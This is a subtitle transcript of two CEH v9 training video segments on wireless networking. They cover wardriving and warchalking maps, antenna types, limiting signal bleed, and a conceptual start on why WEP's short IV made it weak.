travel\nespecially when I go overseas.\n\n819\n00:36:57.278 --> 00:37:02.260\nThere are websites you can go to,\nthat will tell you in a certain city,\n\n820\n00:37:02.260 --> 00:37:04.410\nwhat all the wireless,\nopen wireless access points are.\n\n821\n00:37:04.410 --> 00:37:05.612\nSomebody's mapped these already.\n\n822\n00:37:05.612 --> 00:37:08.317\nThey've WarWalked, and chalked them,\nand or WarDriven them,\n\n823\n00:37:08.317 --> 00:37:10.889\nthey've driven around mapping them,\nhowever they do them.\n\n824\n00:37:10.889 --> 00:37:13.621\nAnd as a result they've mapped\nthem out on a grid, and\n\n825\n00:37:13.621 --> 00:37:17.569\nyou actually can just go pull down\nthe coverage map, find the SSIDs, find any\n\n826\n00:37:17.569 --> 00:37:21.432\ninformation necessary to associate,\nand you know exactly where is this.\n\n827\n00:37:21.432 --> 00:37:24.661\nAnd I'll usually go in, and\nI'll grab this, I'll download it, and\n\n828\n00:37:24.661 --> 00:37:27.728\nI'll have it with me so\nif I'm stuck somewhere between meetings or\n\n829\n00:37:27.728 --> 00:37:31.615\nI'm in a situation where I'm kinda short\non time, I need a quick connection point,\n\n830\n00:37:31.615 --> 00:37:34.550\nI can more or less zero in on\nwhere I am and figure it out.\n\n831\n00:37:34.550 --> 00:37:37.338\nSo we have apps for that literally today,\nyou can just do that.\n\n832\n00:37:37.338 --> 00:37:42.170\nAnd then WarFlag of course is literally\njust going in a low altitude airplane and\n\n833\n00:37:42.170 --> 00:37:44.340\nbeing able to map wireless\ncoverage that way.\n\n834\n00:37:44.340 --> 00:37:48.610\nYou can't really do this when a jet flying\nthree miles above the surface of the Earth\n\n835\n00:37:48.610 --> 00:37:51.249\nor five or\nsix miles above the surface of the Earth.\n\n836\n00:37:51.249 --> 00:37:55.810\nBut you can do it certainly from\na low-flying capability is what we\n\n837\n00:37:55.810 --> 00:37:57.200\nreally need there.\n\n838\n00:37:57.200 --> 00:38:00.190\nSo interesting if you go out and\nlook at some of those signals.\n\n839\n00:38:00.190 --> 00:38:05.060\nTwo kinda parentheses, braces like this,\nsemicircles back to back is\n\n840\n00:38:05.060 --> 00:38:08.290\na free WiFi open area, so\nyou can see like those half coconuts.\n\n841\n00:38:08.290 --> 00:38:09.771\nI can't really do it, but yeah, whatever.\n\n842\n00:38:09.771 --> 00:38:12.400\n&gt;&gt; [LAUGH]\n&gt;&gt; However you do it like that anyway\n\n843\n00:38:12.400 --> 00:38:13.160\nyou can look at it.\n\n844\n00:38:13.160 --> 00:38:17.952\nIf you see a circle with the word huny\nin it, h-u-n-y that's a WiFi honey pot.\n\n845\n00:38:17.952 --> 00:38:21.980\nYou see, you can go and look for\nthese different ones and\n\n846\n00:38:21.980 --> 00:38:25.480\nyou'll see a lot of them have\nthe two parentheticals or\n\n847\n00:38:25.480 --> 00:38:29.150\nthe two braces like this back to back and\nthen you'll see there's a key.\n\n848\n00:38:29.150 --> 00:38:32.170\nA network key associated with\nit yeah some of those exactly.\n\n849\n00:38:32.170 --> 00:38:33.460\nSo you'll see there's differing keys,\n\n850\n00:38:33.460 --> 00:38:36.590\nthe key has a circle,\ntypically on the left hand side.\n\n851\n00:38:36.590 --> 00:38:41.210\nAnd then there's symbols in the key fob or\nin the key circle depending on what it is.\n\n852\n00:38:41.210 --> 00:38:44.424\nYou have a padlock if it's\ngot Mac filtering on it.\n\n853\n00:38:44.424 --> 00:38:47.119\nIf it’s got a dollar sign in it,\nit’s gonna pay for\n\n854\n00:38:47.119 --> 00:38:50.705\nplay kind of wireless that kind of\nstuff so, you could see all that.\n\n855\n00:38:50.705 --> 00:38:52.283\nSo that's what we're talk about there, so\n\n856\n00:38:52.283 --> 00:38:55.145\nif you're interested absolutely\ngo take a look pretty cool stuff.\n\n857\n00:38:55.145 --> 00:38:59.220\nI know that we did a list also for\nwireless antenna types, right?\n\n858\n00:38:59.220 --> 00:39:00.610\nSo we'll take a look at that real quick.\n\n859\n00:39:00.610 --> 00:39:02.500\nWanna educate you a little bit on those.\n\n860\n00:39:02.500 --> 00:39:06.480\nSo, again, treat these as vocabulary\nterms, create some flashcards,\n\n861\n00:39:06.480 --> 00:39:07.800\nmake sure you're comfortable with them.\n\n862\n00:39:07.800 --> 00:39:09.830\nDefinitely wanna know the five\ntypes we've talked about here and\n\n863\n00:39:09.830 --> 00:39:11.170\nhave a sense of them.\n\n864\n00:39:11.170 --> 00:39:13.100\nSo directional antennas, right?\n\n865\n00:39:13.100 --> 00:39:14.560\nThese are ones that are broadcasting and\n\n866\n00:39:14.560 --> 00:39:16.410\nobtaining radio waves\nfrom a single direction.\n\n867\n00:39:16.410 --> 00:39:20.410\nSo think of basically an antenna\nthat's pointed in one direction and\n\n868\n00:39:20.410 --> 00:39:23.490\nbroadcasts in a straight line, right,\nand just kinda side to side point.\n\n869\n00:39:23.490 --> 00:39:25.250\n&gt;&gt; There's gonna be a side\nto side connection.\n\n870\n00:39:25.250 --> 00:39:26.620\n&gt;&gt; Would be directional.\n\n871\n00:39:26.620 --> 00:39:29.410\nRNA could be, they could be moved,\nyou can rotate them, right?\n\n872\n00:39:29.410 --> 00:39:31.240\nIn theory, a lot of times, but\n\n873\n00:39:31.240 --> 00:39:34.610\nthey are designed specifically to\nbroadcast in only one direction.\n\n874\n00:39:34.610 --> 00:39:35.871\nOn the directional,\n\n875\n00:39:35.871 --> 00:39:40.640\n360 degree horizontal view of the system\nwireless based stations use these.\n\n876\n00:39:40.640 --> 00:39:45.091\nThese are the, yeah, the typical-\n&gt;&gt; What are the dipole antennas, or?\n\n877\n00:39:45.091 --> 00:39:47.170\n&gt;&gt; No,\na dipole antennas are bidirectional.\n\n878\n00:39:47.170 --> 00:39:48.680\n&gt;&gt; Okay.\n&gt;&gt; So, and it looks like it.\n\n879\n00:39:48.680 --> 00:39:51.210\nIt's one of the coffee stick antennas.\n\n880\n00:39:51.210 --> 00:39:51.870\n&gt;&gt; Yes, yes.\n\n881\n00:39:51.870 --> 00:39:53.870\n&gt;&gt; It's got the circular base,\nlittle point on top.\n\n882\n00:39:53.870 --> 00:39:56.494\nBut they radiate at 360 degrees,\nright, traditionally.\n\n883\n00:39:56.494 --> 00:39:58.165\nThink of a radar just spinning around.\n\n884\n00:39:58.165 --> 00:40:00.089\nThat's kind of an omnidirectional concept.\n\n885\n00:40:00.089 --> 00:40:02.390\nYou have parabolic grid antennas.\n\n886\n00:40:02.390 --> 00:40:05.928\nThese are based as you see there on\nthe concept in satellite dish, but\n\n887\n00:40:05.928 --> 00:40:07.520\nthey don't have a solid back.\n\n888\n00:40:07.520 --> 00:40:11.530\nThey pick up wi-fi signals\nout to long distances.\n\n889\n00:40:11.530 --> 00:40:16.780\nSo we use them to propagate long or\nvery long distance lines kind of signals.\n\n890\n00:40:16.780 --> 00:40:18.400\nSo these are heavy-duty antennas.\n\n891\n00:40:18.400 --> 00:40:21.320\nYou're not gonna typically\ndeploy a parabolic grid.\n\n892\n00:40:21.320 --> 00:40:22.430\nBut in remote areas,\n\n893\n00:40:22.430 --> 00:40:26.010\nwhen they're setting up point-to-point\nwireless, we often see these.\n\n894\n00:40:26.010 --> 00:40:33.320\nI've seen and I've actually been involved\nwith setting up what the hell are they?\n\n895\n00:40:33.320 --> 00:40:37.230\nRemote sites for\nlet's say remote monitoring, right, so\n\n896\n00:40:37.230 --> 00:40:41.220\nthink about you're in-\n&gt;&gt; A dam or\n\n897\n00:40:41.220 --> 00:40:43.750\na water level or a-\n&gt;&gt; Something like that, or\n\n898\n00:40:43.750 --> 00:40:48.180\nyou're in maybe a I've got\n\n899\n00:40:48.180 --> 00:40:51.290\nthe name on my mind an airport I'm just\ntrying to think of what it is right so.\n\n900\n00:40:51.290 --> 00:40:53.850\nBig place lots of planes\nlots of open spaces right.\n\n901\n00:40:53.850 --> 00:40:56.600\nSo if you're out on an airport a lot of\ntimes on the edges of the airport you see\n\n902\n00:40:56.600 --> 00:41:00.670\nthe buildings with the red and white\ncheckered flag painting on it which is\n\n903\n00:41:00.670 --> 00:41:04.550\ntypically the remote outlying buildings\nwhere they have the radar gear right.\n\n904\n00:41:04.550 --> 00:41:07.880\nSo they've got remote gear that's sitting\nthere that's generating signals and\n\n905\n00:41:07.880 --> 00:41:09.910\ndoing stuff and\nmonitoring weather and all that.\n\n906\n00:41:09.910 --> 00:41:12.300\nThey've got the wind sock and\nall that kind of stuff on it.\n\n907\n00:41:12.300 --> 00:41:16.500\nA lot of times you'll see antennas on\nthose that are beaming signals back in\n\n908\n00:41:16.500 --> 00:41:20.600\nto the core of the airport to gather\ndata and do things like that.\n\n909\n00:41:20.600 --> 00:41:24.750\nSometimes they'll set up a parabolic\ngrid to be able to bring that stuff in,\n\n910\n00:41:24.750 --> 00:41:26.810\ndepending on the distance from the site.\n\n911\n00:41:26.810 --> 00:41:28.260\nSo you see that kind of stuff.\n\n912\n00:41:28.260 --> 00:41:29.840\n&gt;&gt; They don't have that solid back.\n\n913\n00:41:29.840 --> 00:41:31.910\nA lot of times these\nare portable too right?\n\n914\n00:41:31.910 --> 00:41:33.350\n&gt;&gt; They are\n&gt;&gt; They fold up and\n\n915\n00:41:33.350 --> 00:41:34.680\ntake to these remote sites.\n\n916\n00:41:34.680 --> 00:41:36.110\n&gt;&gt; Yeah just apply them.\n\n917\n00:41:36.110 --> 00:41:38.080\nThey are just like pop up\nantennas a lot of the time.\n\n918\n00:41:38.080 --> 00:41:39.490\nExactly, exactly correct.\n\n919\n00:41:39.490 --> 00:41:41.520\nWhat would I do without you?\n\n920\n00:41:41.520 --> 00:41:44.150\nYou are a wealth, a fountain of knowledge.\n\n921\n00:41:45.270 --> 00:41:46.310\nOften times useless.\n\n922\n00:41:46.310 --> 00:41:47.335\nBut occasionally very useful.\n\n923\n00:41:47.335 --> 00:41:47.901\n&gt;&gt; Once in a while.\n\n924\n00:41:47.901 --> 00:41:49.630\n&gt;&gt; So it's ones in a while,\nwe do get it going.\n\n925\n00:41:49.630 --> 00:41:51.910\nAnd let's go back we got a couple\nmore that I want to talk about.\n\n926\n00:41:51.910 --> 00:41:54.100\nYou mentioned dipole,\nwe'll get to that in just a minute.\n\n927\n00:41:54.100 --> 00:41:57.200\nThe Yagi Antenna is well\nsomebody call this a Yogi\n\n928\n00:41:57.200 --> 00:41:59.590\nantenna in one of my classes and\nargued with me.\n\n929\n00:41:59.590 --> 00:42:00.950\nNo, it's Yogi antenna.\n\n930\n00:42:00.950 --> 00:42:04.890\nNo, a Yogi is a person who does\nyoga can be very knowledgeable.\n\n931\n00:42:04.890 --> 00:42:07.630\n&gt;&gt; I thought it was the guy looking for\nthe picnic baskets.\n\n932\n00:42:07.630 --> 00:42:09.790\n&gt;&gt; That's also, yes,\nBoo-Boo Bear and Yogi.\n\n933\n00:42:09.790 --> 00:42:11.420\nYes, that's also another kind of yogi.\n\n934\n00:42:11.420 --> 00:42:13.402\nAll right, I remember those cartoons.\n\n935\n00:42:13.402 --> 00:42:14.138\n&gt;&gt; [LAUGH] Yeah.\n\n936\n00:42:14.138 --> 00:42:15.331\n&gt;&gt; That was cool, Yogi Bear.\n\n937\n00:42:15.331 --> 00:42:16.380\nYeah, that was cool.\n\n938\n00:42:16.380 --> 00:42:20.240\nBut then we have the Yagi antenna, which\nis not a person who is very knowledgeable\n\n939\n00:42:20.240 --> 00:42:23.550\nabout yoga, and or\na bear looking to take your picnic basket.\n\n940\n00:42:23.550 --> 00:42:25.370\nIt is actually a wireless antenna type.\n\n941\n00:42:25.370 --> 00:42:26.470\n&gt;&gt; But it might help you find the bear.\n\n942\n00:42:26.470 --> 00:42:28.430\n&gt;&gt; But it could help you locate the bear,\nthat's very true.\n\n943\n00:42:28.430 --> 00:42:30.630\nBut then you would have to ba\nable to tranquillize the bear and\n\n944\n00:42:30.630 --> 00:42:31.540\nthe basket away from the bear.\n\n945\n00:42:31.540 --> 00:42:32.050\n&gt;&gt; That's true.\n&gt;&gt; So\n\n946\n00:42:32.050 --> 00:42:34.850\nyou'd hit the bear over the head\nwith a parabolic grid antenna and\n\n947\n00:42:34.850 --> 00:42:38.630\nthen run away with the picnic basket, or\nyou'd have to bring an intern with you and\n\n948\n00:42:38.630 --> 00:42:40.420\nthrow the intern in front of the bear,\n\n949\n00:42:40.420 --> 00:42:43.000\ndistracting them,\nwhich is another use for interns.\n\n950\n00:42:43.000 --> 00:42:44.750\nAnd then you would be\nable to then run away.\n\n951\n00:42:44.750 --> 00:42:46.240\n&gt;&gt; As long as you're\nfaster than the interns.\n\n952\n00:42:46.240 --> 00:42:48.890\n&gt;&gt; You just have to be faster than\nthe last person between you and the bear,\n\n953\n00:42:48.890 --> 00:42:49.780\nthat's all that matters.\n\n954\n00:42:49.780 --> 00:42:51.420\nExactly correct all right.\n\n955\n00:42:51.420 --> 00:42:55.387\n&gt;&gt; So did you see these like I think with\nthe Yagis I always think of my the old\n\n956\n00:42:55.387 --> 00:42:59.160\nantennas again dating ourselves\nthat we used to have on our house?\n\n957\n00:42:59.160 --> 00:43:00.340\n&gt;&gt; Sure, sure, sure yeah.\n\n958\n00:43:00.340 --> 00:43:03.750\n&gt;&gt; But you see the wildlife guys\ncuz they can narrow their signal.\n\n959\n00:43:03.750 --> 00:43:05.890\n&gt;&gt; They walk around with the grid.\n\n960\n00:43:05.890 --> 00:43:09.040\nIt's literally it's one of,\n[INAUDIBLE] go on the edge.\n\n961\n00:43:09.040 --> 00:43:11.290\nYeah, I'm trying to get\nthe hand thing down, right?\n\n962\n00:43:11.290 --> 00:43:12.030\n&gt;&gt; There it is.\n\n963\n00:43:12.030 --> 00:43:13.780\n&gt;&gt; Yeah, so I'm going the wrong way.\n\n964\n00:43:13.780 --> 00:43:14.560\nOkay, here we go, right?\n\n965\n00:43:14.560 --> 00:43:15.550\nMoving like this, right?\n\n966\n00:43:15.550 --> 00:43:18.240\nAnd you would scan, and there would be\na little point sticking out of the middle,\n\n967\n00:43:18.240 --> 00:43:22.940\nand it was the wires, and you'd go around\nlike this, they'd walk around yeah.\n\n968\n00:43:22.940 --> 00:43:24.890\n&gt;&gt; [SOUND]\n&gt;&gt; Right, like that.\n\n969\n00:43:24.890 --> 00:43:25.810\nOkay, so.\n\n970\n00:43:25.810 --> 00:43:27.480\nSo that's what the antenna looks like.\n\n971\n00:43:27.480 --> 00:43:28.640\nIt looks something like that.\n\n972\n00:43:28.640 --> 00:43:32.410\nIt's that metal, almost like oval-ish\nkind of antenna a lot of the times.\n\n973\n00:43:32.410 --> 00:43:35.020\nAnd it's got the little thing and\nyou're right it is, can be hand held and\n\n974\n00:43:35.020 --> 00:43:35.830\nwalk around with it.\n\n975\n00:43:35.830 --> 00:43:38.290\nLooks like a ray gun, like one of those\nlittle ray guns a lot of the time.\n\n976\n00:43:38.290 --> 00:43:39.640\nSo, we do have that so\n\n977\n00:43:39.640 --> 00:43:41.150\nwe have Yagi antennas\n&gt;&gt; [LAUGH]\n\n978\n00:43:41.150 --> 00:43:42.620\n&gt;&gt; And we have dipole\n\n979\n00:43:42.620 --> 00:43:43.460\nantennas as well right?\n\n980\n00:43:43.460 --> 00:43:46.120\nWe talked about dipole I think up on\nthe list did you have that one up there as\n\n981\n00:43:46.120 --> 00:43:46.810\nwell at the back of the list?\n\n982\n00:43:46.810 --> 00:43:47.820\n&gt;&gt; At the very list one.\n&gt;&gt; There we go yeah.\n\n983\n00:43:47.820 --> 00:43:50.400\nSo we have bi directional antennas\nthat's the one you mentioned that\n\n984\n00:43:50.400 --> 00:43:54.204\nare used to support typically client\nconnections rather than site-to-site.\n\n985\n00:43:54.204 --> 00:43:54.877\nThe dipole.\n\n986\n00:43:54.877 --> 00:43:57.850\n&gt;&gt; It's limited it's smaller\nwe use the parabolic\n\n987\n00:43:57.850 --> 00:44:01.116\ngrid when we use the site-to-site\nas opposed to dipoles right.\n\n988\n00:44:01.116 --> 00:44:03.592\n&gt;&gt; Never knew that antenna\ntypes could be so much fun.\n\n989\n00:44:03.592 --> 00:44:05.950\n&gt;&gt; Yeah yeah and\nthen there's like paddle antennas.\n\n990\n00:44:05.950 --> 00:44:08.160\nThere's a lot that we didn't put on here,\nbut\n\n991\n00:44:08.160 --> 00:44:10.150\nyou have paddle antennas that are flat.\n\n992\n00:44:10.150 --> 00:44:12.110\nThey almost look literally like a paddle.\n\n993\n00:44:12.110 --> 00:44:14.920\nThey stick out like little flippers or\nfins on the side.\n\n994\n00:44:14.920 --> 00:44:15.870\n&gt;&gt; Apartment complex.\n\n995\n00:44:15.870 --> 00:44:19.380\n&gt;&gt; You do those to make it rotate so\nthey're basically a flat grid and\n\n996\n00:44:19.380 --> 00:44:21.210\nyou rotate them like this so\nyou angle them and\n\n997\n00:44:21.210 --> 00:44:23.720\nthey broadcast out in a 180\nfield as opposed to 360.\n\n998\n00:44:23.720 --> 00:44:28.720\nSo a lot of times you'll put them up\nagainst the edge of the coverage area in\n\n999\n00:44:28.720 --> 00:44:31.840\na building where you wanna radiate\nsignals in but not out, right?\n\n1000\n00:44:31.840 --> 00:44:34.280\nBecause we don't wanna have signal\nbleed out in the parking lot.\n\n1001\n00:44:34.280 --> 00:44:37.950\nSo you'll radiate them back with paddle\nantennas inside the building that keep\n\n1002\n00:44:37.950 --> 00:44:41.010\nthe perimeter essentially defined based\non the actual boundaries of the building.\n\n1003\n00:44:41.010 --> 00:44:42.980\nSo there's a lot of cool\nstuff you could do there.\n\n1004\n00:44:42.980 --> 00:44:46.220\nAnd also remember though we didn't talk\nabout it with regards to antennas, we\n\n1005\n00:44:46.220 --> 00:44:50.010\nset these things up and we often say well\nyeah just turn it on and boom you're good.\n\n1006\n00:44:50.010 --> 00:44:53.000\nBut the reality is that you can go\nto these wireless access points and\n\n1007\n00:44:53.000 --> 00:44:54.400\ncut back on the transmission power.\n\n1008\n00:44:54.400 --> 00:44:55.780\nA lot of times people don't realize this.\n\n1009\n00:44:55.780 --> 00:44:59.680\nOne of things we have to do to prevent\nsignal bleed and parking lot attacks which\n\n1010\n00:44:59.680 --> 00:45:03.720\nare people driving by and you know\nessentially ganging up on your wireless,\n\n1011\n00:45:03.720 --> 00:45:07.130\nand using it without your knowledge,\nis cut back on the broadcast power.\n\n1012\n00:45:07.130 --> 00:45:11.180\nSo typically, these systems normally come\nonline full strength and you may get 100,\n\n1013\n00:45:11.180 --> 00:45:13.880\n200, 500 feet signal bleed out,\ninto even longer,\n\n1014\n00:45:13.880 --> 00:45:17.690\ndepending on the kind of antenna you're\nusing and the strength of the signal.\n\n1015\n00:45:17.690 --> 00:45:22.000\nYou wanna cut that back and then do a\nperimeter test to see exactly how far that\n\n1016\n00:45:22.000 --> 00:45:24.560\nsignal bleeds out and\nadjust your antennas accordingly.\n\n1017\n00:45:24.560 --> 00:45:26.760\nIt's one of the things you learn\nabout when we do site surveys and\n\n1018\n00:45:26.760 --> 00:45:27.870\nwe set this kind of stuff up.\n\n1019\n00:45:27.870 --> 00:45:30.630\nSo, just some stuff to consider\nas we start to talk about it.\n\n1020\n00:45:30.630 --> 00:45:33.270\nI know upcoming, we'll be talking\nabout types of wireless encryption.\n\n1021\n00:45:33.270 --> 00:45:35.090\nWe've got a long vocabulary list there.\n\n1022\n00:45:35.090 --> 00:45:37.140\nAnd talk about how some of these\nattacks get propagated and\n\n1023\n00:45:37.140 --> 00:45:38.830\nhow things like WEP are good but\n\n1024\n00:45:38.830 --> 00:45:41.960\nalso the weaknesses associated with\nthem and how we defend against that.\n\n1025\n00:45:41.960 --> 00:45:43.790\nSo I know that's coming\nup right okay good.\n\n1026\n00:45:43.790 --> 00:45:46.510\n&gt;&gt; All right Adam,\nagain another great show there.\n\n1027\n00:45:46.510 --> 00:45:49.710\nFirst look at wireless got to take a look\nat some of the standards associated with\n\n1028\n00:45:49.710 --> 00:45:53.250\nwireless, some of the authentication\nmethods and tenant types.\n\n1029\n00:45:53.250 --> 00:45:55.340\nAnd as Adam said,\nwe've got more to go with wireless but\n\n1030\n00:45:55.340 --> 00:45:58.550\nunfortunately, we're out of time for\nthis particular episode.\n\n1031\n00:45:58.550 --> 00:46:00.730\nSo I hope you guys out\nthere enjoyed watching.\n\n1032\n00:46:00.730 --> 00:46:03.320\nSigning off for IT Pro TV,\nI'm Mike Roderick.\n\n1033\n00:46:03.320 --> 00:46:04.690\n&gt;&gt; I am Adam Gordon.\n\n1034\n00:46:04.690 --> 00:46:07.703\nAlthough actually I want to be a Yagi\nparabolic antenna with a dipole in\n\n1035\n00:46:07.703 --> 00:46:08.250\nthe middle.\n\n1036\n00:46:08.250 --> 00:46:08.806\n&gt;&gt; In the middle.\n\n1037\n00:46:08.806 --> 00:46:09.314\nYeah.\n&gt;&gt; I like it.\n\n1038\n00:46:09.314 --> 00:46:11.540\n&gt;&gt; I'm that complicated guy that orders\n\n1039\n00:46:11.540 --> 00:46:13.460\nthat crazy drink that you never\nwant to be behind in line.\n\n1040\n00:46:13.460 --> 00:46:14.860\n&gt;&gt; Let me go look that up.\n\n1041\n00:46:14.860 --> 00:46:15.940\n&gt;&gt; Yeah.\n&gt;&gt; Hold on.\n\n1042\n00:46:15.940 --> 00:46:17.035\n&gt;&gt; Yeah.\n&gt;&gt; I hope everybody out there\n\n1043\n00:46:17.035 --> 00:46:17.653\nenjoyed watching.\n\n1044\n00:46:17.653 --> 00:46:18.780\nSee you next time.\n\n1045\n00:46:18.780 --> 00:46:28.780\n[MUSIC]\n\n",

TV.\n\n3\n00:00:15.797 --> 00:00:16.918\nI'm your host, Mike Rodrick [LAUGH] and\n\n4\n00:00:16.918 --> 00:00:18.176\nI don't know who this nut\nis [CROSSTALK] [LAUGH]\n\n5\n00:00:18.176 --> 00:00:19.640\n&gt;&gt; I always wanted to do that.\n\n6\n00:00:19.640 --> 00:00:22.569\nYou're so serious when you introduce us,\nso I'm like-\n\n7\n00:00:22.569 --> 00:00:23.614\n&gt;&gt; Cuz if I don't say it exactly the same\n\n8\n00:00:23.614 --> 00:00:24.468\nway every time I'll forget.\n\n9\n00:00:24.468 --> 00:00:25.608\n&gt;&gt; Because then you screw it up.\n\n10\n00:00:25.608 --> 00:00:26.640\n&gt;&gt; Yeah, exactly.\n\n11\n00:00:26.640 --> 00:00:28.036\n&gt;&gt; I'd just figured I'd do\nsomething unobtrusive and\n\n12\n00:00:28.036 --> 00:00:29.474\nsee what happens [CROSSTALK]\n&gt;&gt; So here we are, and\n\n13\n00:00:29.474 --> 00:00:31.170\nwe're going to talk about stuff.\n\n14\n00:00:31.170 --> 00:00:35.850\nAnd we are doing our CEH Version 9,\nwe're doing it wireless, this is part two.\n\n15\n00:00:35.850 --> 00:00:38.328\nSo make sure you go back and\nwatch that first part,\n\n16\n00:00:38.328 --> 00:00:42.227\nbecause we did a lot of the foundation\nwork, we talked about the terminology,\n\n17\n00:00:42.227 --> 00:00:44.255\nthe vocab, some standards by the IEEE.\n\n18\n00:00:44.255 --> 00:00:46.675\nNow we’re going to move\non into more wireless,\n\n19\n00:00:46.675 --> 00:00:48.740\nwe’re going to start with encryption.\n\n20\n00:00:48.740 --> 00:00:50.290\nObviously, a very\nimportant part of wireless,\n\n21\n00:00:50.290 --> 00:00:53.310\ncuz we talk about wireless\nnetworks unbound media.\n\n22\n00:00:53.310 --> 00:00:56.650\nThat means that data is just floating\nout there in space, really easy for\n\n23\n00:00:56.650 --> 00:00:59.490\nsomeone to try to grab,\nvery important that we protect it.\n\n24\n00:00:59.490 --> 00:01:03.470\nAnd here to help us with that, while\ntrying to grab my wireless signal, is Mr.\n\n25\n00:01:03.470 --> 00:01:04.030\nAdam Gordon.\n\n26\n00:01:04.030 --> 00:01:04.625\nHow you doing, Adam?\n\n27\n00:01:04.625 --> 00:01:06.446\n[LAUGH]\n&gt;&gt; I was floating in space and\n\n28\n00:01:06.446 --> 00:01:07.429\nthen I grabbed something.\n\n29\n00:01:07.429 --> 00:01:09.151\n&gt;&gt; [LAUGH]\n&gt;&gt; So wait, let me see if I can actually,\n\n30\n00:01:09.151 --> 00:01:11.237\nwe did this once, can I,\nyeah, there we go [SOUND].\n\n31\n00:01:11.237 --> 00:01:12.042\n&gt;&gt; Right on the bug, right.\n\n32\n00:01:12.042 --> 00:01:13.882\n[LAUGH]\n&gt;&gt; Awesome, and then it goes away,\n\n33\n00:01:13.882 --> 00:01:14.900\noutstanding.\n\n34\n00:01:14.900 --> 00:01:17.305\nSo, you ever play that game when you were\na kid, remember in the arcades we'd go to?\n\n35\n00:01:17.305 --> 00:01:17.924\n&gt;&gt; The crane?\n\n36\n00:01:17.924 --> 00:01:20.705\n&gt;&gt; You know with the crane and the claw,\nand you would never be able to grab that\n\n37\n00:01:20.705 --> 00:01:22.290\nstupid.-\n&gt;&gt; It looked so easy.\n\n38\n00:01:22.290 --> 00:01:25.071\n&gt;&gt; Toy, but then you wasted\na million dollars on that thing.\n\n39\n00:01:25.071 --> 00:01:26.054\n&gt;&gt; Yes, I hate those.\n\n40\n00:01:26.054 --> 00:01:28.842\n&gt;&gt; Yeah, yeah, so good times, good times.\n\n41\n00:01:28.842 --> 00:01:31.780\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so we're going to talk about\n\n42\n00:01:31.780 --> 00:01:34.800\ncontinuing with wireless, but this time\nwe're going to do some more vocabulary.\n\n43\n00:01:34.800 --> 00:01:37.720\nIt is important, this is one of\nthose sections, one of those areas\n\n44\n00:01:37.720 --> 00:01:41.750\nin the discussion CEH knowledge based,\nwhere we have a lot of terminology,\n\n45\n00:01:41.750 --> 00:01:45.180\nlot of vocabulary, lot of ideas right,\nthat are very critical to our success,\n\n46\n00:01:45.180 --> 00:01:47.600\nand our ability to\nunderstand what we're doing.\n\n47\n00:01:47.600 --> 00:01:50.840\nWe're gonna start by focusing on\nencryption, and talking about,\n\n48\n00:01:50.840 --> 00:01:55.340\nkinda actually going ahead in the sense\nof the episodes for cryptography, looking\n\n49\n00:01:55.340 --> 00:01:59.200\nahead to that stuff that you'll see there,\nand that we've talked extensively about.\n\n50\n00:01:59.200 --> 00:02:04.200\nBut we're gonna use the specificity to\ndiscuss cryptography with regards to\n\n51\n00:02:04.200 --> 00:02:10.100\nwireless and talk about things like\nWEP and AES and LEAP and EAP and\n\n52\n00:02:10.100 --> 00:02:15.720\nRADIUS and CCMP and ABC and 123,\nand do, re, mi, and you and\n\n53\n00:02:15.720 --> 00:02:19.060\nme, and can we all just live together and\nget along, and all that good stuff.\n\n54\n00:02:19.060 --> 00:02:22.480\nSo let's, I know we have a list,\nI know you put together a bunch of stuff.\n\n55\n00:02:22.480 --> 00:02:26.680\nSo, if we can go to the list on there,\nthere we go, on Mike's machine.\n\n56\n00:02:26.680 --> 00:02:29.360\nLet's start by going through\nsome of the vocabulary.\n\n57\n00:02:29.360 --> 00:02:31.523\nWe're gonna just start\nat the top with WEP.\n\n58\n00:02:31.523 --> 00:02:35.025\nIt's interesting in the sense that\na lot of times you talk about wireless,\n\n59\n00:02:35.025 --> 00:02:38.710\nwireless encryption, and really all we\nhave to say about WEP is, a WEP right?\n\n60\n00:02:38.710 --> 00:02:40.700\nYou shouldn't use that, that sucks.\n\n61\n00:02:40.700 --> 00:02:42.427\nThat's horrible, you never wanna use that.\n\n62\n00:02:42.427 --> 00:02:44.440\nBut we don't really take\nthe time to understand why.\n\n63\n00:02:44.440 --> 00:02:48.050\nAnd we don't really ever take\nthe time to talk about the issues and\n\n64\n00:02:48.050 --> 00:02:50.580\nconcerns with WEP and break it down, so\n\n65\n00:02:50.580 --> 00:02:54.710\nthat we can actually understand\nwhat it is that we're saying no to.\n\n66\n00:02:54.710 --> 00:02:58.990\nAnd instead of just kinda, you'll say\nno it's not good, and let's move on and\n\n67\n00:02:58.990 --> 00:03:02.400\ndo WPA2 with Enterprise or\nwhatever it may be.\n\n68\n00:03:02.400 --> 00:03:05.230\nWe should go back and\nactually learn from our mistakes, right?\n\n69\n00:03:05.230 --> 00:03:07.880\nAnd understand what the problem was,\nand we have done that.\n\n70\n00:03:07.880 --> 00:03:11.950\nThe architects of the newer systems\nlike WPA2 have learned from\n\n71\n00:03:11.950 --> 00:03:15.390\nthe problems with WEP, but the people\nthat implement may not have, right?\n\n72\n00:03:15.390 --> 00:03:18.651\nAnd because we don't know any better,\nwe may not understand the problem,\n\n73\n00:03:18.651 --> 00:03:21.733\nand therefore understand the concern\nthat we may propagate forward.\n\n74\n00:03:21.733 --> 00:03:24.315\n&gt;&gt; Mm-hm.\nSo we want to take the time to actually\n\n75\n00:03:24.315 --> 00:03:29.080\nwalk you through this, take the time to\nunderstand why WEP actually as a concept,\n\n76\n00:03:29.080 --> 00:03:33.080\nas an idea, was valid, was good and\nshould have worked well.\n\n77\n00:03:33.080 --> 00:03:36.920\nBut the problem is it's the case\na lot with these issues,\n\n78\n00:03:36.920 --> 00:03:38.350\nis the devil's in the details, right?\n\n79\n00:03:38.350 --> 00:03:42.270\nIt was the implementation of WEP,\nunfortunately, that screwed it up.\n\n80\n00:03:42.270 --> 00:03:46.320\nAnd specifically, it was a couple of\nbad choices with regards to the size of\n\n81\n00:03:46.320 --> 00:03:48.320\nthe IV, the Initialization Vector.\n\n82\n00:03:48.320 --> 00:03:52.100\nThe initial randomness solution that\nwe use up to the beginning was 24 bit,\n\n83\n00:03:52.100 --> 00:03:53.020\nvery small.\n\n84\n00:03:53.020 --> 00:03:58.940\nNot big enough to allow for very large\nextended periods without repeat of frames.\n\n85\n00:03:58.940 --> 00:04:01.560\nAnd the key space was very small as well,\nunfortunately.\n\n86\n00:04:01.560 --> 00:04:04.390\nYeah, we use our RC4 as\nthe algorithm underlying WEP.\n\n87\n00:04:04.390 --> 00:04:09.880\nAgain, people often misunderstand\nthat WEP itself is not the encryption\n\n88\n00:04:09.880 --> 00:04:11.790\nthought process that people think it is.\n\n89\n00:04:11.790 